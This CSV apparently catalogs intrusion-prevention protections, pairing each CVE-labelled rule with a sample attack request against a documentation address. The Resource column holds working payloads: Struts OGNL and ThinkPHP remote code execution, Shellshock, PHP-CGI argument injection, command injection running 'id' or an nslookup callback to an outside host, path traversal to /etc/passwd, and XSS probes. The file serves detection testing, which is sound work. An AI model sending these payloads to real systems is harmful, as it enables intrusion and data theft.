ProtectionName,IndustryReference,Method,Resource,Service,ConfidenceLevel,Severity,PerformanceImpact,Agent
Apache Struts Remote Code Execution (CVE-2013-2251),CVE-2013-2251,GET,http://203.0.113.250/?action:%{(new java.lang.ProcessBuilder(new java.lang.String[]{'ipconfig'})).start()},http,High,High,Medium,
Apache Tomcat Server Malicious Request Information Disclosure,"CVE-2002-2006,CVE-2002-2007,CVE-2002-2008",GET,http://203.0.113.250/examples/jsp/source.jsp?../../../../system/autoexec.ncf,http,High,Medium,Medium,
Athena Web Registration Command Injection (CVE-2004-1782),CVE-2004-1782,GET,http://203.0.113.250/cgi-bin/athenareg.php?pass= ;id,http,Medium,High,Medium,
AWStats Totals awstatstotals.php sort Parameter Code Execution,CVE-2008-3922,GET,"http://203.0.113.250/awstatstotals.php?sort=""].passthru('id').exit().$a[""",http,Medium,High,Medium,
ClamAV Mail Filter Extension Crafted Recipient Command Execution,CVE-2007-4560,,,smtp,Low,High,Low,
Directory Traversal Obfuscations,,GET,http://203.0.113.250/cgi-bin/modules/Printing/output.php?url=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vYm9vdC5pbmk=,http,Medium,Critical,Medium,
D-Link Multiple Products Information Disclosure (CVE-2024-0717),CVE-2024-0717,GET,http://203.0.113.250/devinfo?area=notice|net|version,http,Medium,High,Medium,
HP OpenView Network Node Manager Remote Command Execution,CVE-2005-2773,GET,http://203.0.113.250/OvCgi/freeIPaddrs.ovpl?netnum=127.0.0.1&netmask=255.255.255.0&netid=127.0.0.1 | id|,http,High,Critical,Medium,
HTTP Headers Remote Code Execution,"CVE-2014-5470,CVE-2020-10826,CVE-2020-10827,CVE-2020-10828,CVE-2020-13756,CVE-2021-1472,CVE-2021-1473,CVE-2021-42071",GET,http://203.0.113.250/,http,Medium,Critical,Medium,"Other: () { ignored; }; echo Content-Type: text/plain ; echo ; echo ""bash_cve_2014_6271_rce Output : $((83+66))"""
Linux System Files Information Disclosure,"CVE-2000-0208,CVE-2018-10823,CVE-2018-1144,CVE-2018-3948,CVE-2019-9926",GET,http://203.0.113.250/etc/passwd,http,Medium,Critical,Medium,
Microsoft FrontPage Server Extensions Buffer Overrun (MS03-051: CVE-2003-0822),CVE-2003-0822,POST,http://203.0.113.250/_vti_bin/_vti_aut/fp30reg.dll,http,High,High,Medium,
Null HTTP Encodings,"CAN-2004-0848,CVE-2007-0042,CVE-2016-4510,CVE-2016-4532",GET,http://203.0.113.250/cgi-bin/pdesk.cgi?lang=../../../../../../../../etc/passwd%00,http,High,High,Medium,
PHP Easter Egg Information Disclosure,,GET,http://203.0.113.250/index.php/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000,http,High,Medium,Medium,
PHP Functions Remote Code Execution,,GET,http://203.0.113.250/cgi-bin/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=</option></SELECT><?phpinfo();?>,http,Medium,Critical,Medium,
PHP Wrappers Local File Inclusion,,POST,"http://203.0.113.250/phppath/php?-d allow_url_include=on -d safe_mode=off -d suhosin.simulation=on -d disable_functions="""" -d open_basedir=none -d auto_prepend_file=php://input -n",http,Medium,Critical,Medium,
PhpMyAdmin SERVER Superglobal Remote Variable Manipulation,,GET,http://203.0.113.250/cgi-bin/index2.php?_SERVER[]=&_SERVER[REMOTE_ADDR]='.system('id').exit().'&option=wrapper&module[module]=1,http,High,High,Medium,
Python Server-Side Template Injection,"CVE-2018-13818,CVE-2019-8341,CVE-2021-21479,CVE-2022-34625,CVE-2023-33570,CVE-2024-22722,CVE-2024-25624,CVE-2024-27516,CVE-2024-27623,CVE-2024-2952,CVE-2024-29686,CVE-2024-32406",GET,http://203.0.113.250/${264010060+5}.action,http,Medium,Critical,Medium,
ThinkPHP Remote Code Execution (CVE-2018-20062),CVE-2018-20062,GET,http://203.0.113.250/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_get_contents&vars[1][]=index.phpadmin/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_get_contents&vars[1][]=index.php,http,Medium,Critical,Medium,
Web Server Exposed Git Repository Information Disclosure,,GET,http://203.0.113.250/.git/HEAD,http,High,Critical,Medium,
WebSVN Remote Code Execution (CVE-2021-32305),CVE-2021-32305,GET,http://203.0.113.250/cgi-bin/search.php?Submit=true&search=');,http,Medium,Critical,Medium,
Apple CUPS Web Interface URL Handling Cross-Site Scripting,CVE-2014-2856,GET,http://203.0.113.250/<script>foo</script>,http,Low,High,Medium,
Cross-Site Scripting Obfuscation Techniques,"CVE-2020-11930,CVE-2021-26475,CVE-2021-26702,CVE-2021-26723,CVE-2021-39496,CVE-2022-46888,CVE-2023-23491,CVE-2023-24488,CVE-2023-26046,CVE-2023-28664,CVE-2023-28665,CVE-2023-28666,CVE-2023-4117",GET,"http://203.0.113.250/c3cxh1g3.aspx?<script>document.cookie=""testmtwl=1487;""</script>",http,Medium,Critical,Medium,
Cross-Site Scripting Scanning Attempt,"CVE-2022-27166,CVE-2022-27926,CVE-2022-28102,CVE-2022-28363,CVE-2022-29548,CVE-2022-30776,CVE-2022-30777,CVE-2022-31798,CVE-2022-3960,CVE-2022-46381,CVE-2022-48311,CVE-2023-23383,CVE-2023-43770,CVE-2024-30268",GET,"http://203.0.113.250/WebID/IISWebAgentIF.dll?postdata=""><script>foo</script>",http,High,Critical,Medium,
Fortinet FortiOS SSL VPN Directory Traversal (CVE-2018-13379),CVE-2018-13379,GET,http://203.0.113.250/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession,http,Medium,Critical,Medium,
Microsoft Exchange OWA Cross-Site Scripting and Spoofing (MS04-026),CVE-2004-0203,GET,http://203.0.113.250/popuplargeimage.asp?strImageTag=<script>foo</script>,http,High,Medium,Low,
Multiple IoT Command Injection,CVE-2009-2765,GET,http://203.0.113.250/cgi-bin/.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./windows/win.ini,http,Medium,Critical,Medium,
Node.JS System Information Command Injection (CVE-2021-21315),CVE-2021-21315,GET,"http://203.0.113.250/api/getServices?name[]=$(/bin/bash -c ""nslookup log4shell-generic-SFfbYhbXKvQd58SXE2vXten.w.nessus.org)",http,Medium,High,Medium,
Oracle Secure Backup Multiple Command Injections,"CVE-2008-4006,CVE-2008-5448,CVE-2008-5449",GET,http://203.0.113.250/login.php?attempt=1&uname= 1731363096,http,High,Critical,Medium,
Spreecommerce Command Injection,,GET,http://203.0.113.250/cgi-bin/api/orders.json?search[instance_eval]=Kernel.fail `ipconfig /all`,http,Medium,High,Medium,
Web Clients HTTP URL Escape Sequence Cross-Site Scripting,,GET,"http://203.0.113.250/WebID/IISWebAgentIF.dll?postdata=""><script>foo</script>",http,Low,Critical,Medium,
Web Clients HTTP URL HTML Entity Cross-Site Scripting,,GET,"http://203.0.113.250/c3cxh1g3.asp?<meta http-equiv=Set-Cookie content=""testmtwl=1487"">",http,Low,Critical,High,
Web Clients HTTP URL JavaScript Function Cross-Site Scripting,"CVE-2015-1159,CVE-2015-6099,CVE-2015-6972,CVE-2017-0068",GET,http://203.0.113.250/launch.jsp?NFuse_Application=>alert('citrix_xss-1731362411');</script>,http,Low,Critical,Medium,
Web Servers Malicious Encoding Directory Traversal,CVE-2015-4666,GET,http://203.0.113.250/.../.../.../.../.../.../.../.../.../windows/win.ini,http,High,Critical,Medium,
